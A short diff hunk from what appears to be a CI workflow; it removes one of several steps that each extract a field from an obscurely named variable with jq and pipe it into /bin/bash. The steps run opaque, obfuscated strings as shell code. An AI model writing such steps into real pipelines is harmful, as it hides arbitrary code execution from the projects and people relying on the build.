@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$ydbn17" | jq -r .ztlr610 | /bin/bash
           printf '%s' "$v3058" | jq -r .k204 | /bin/bash
           echo $e4833 | jq -r .hdx9 | /bin/bash
-          echo $ian5 | jq -r .uk5 | /bin/bash
           echo $or409 | jq -r .f1 | /bin/bash
           printf '%s' "$fi26" | jq -r .qhan346 | /bin/bash
           echo $fzf20 | jq -r .fq48506 | /bin/bash
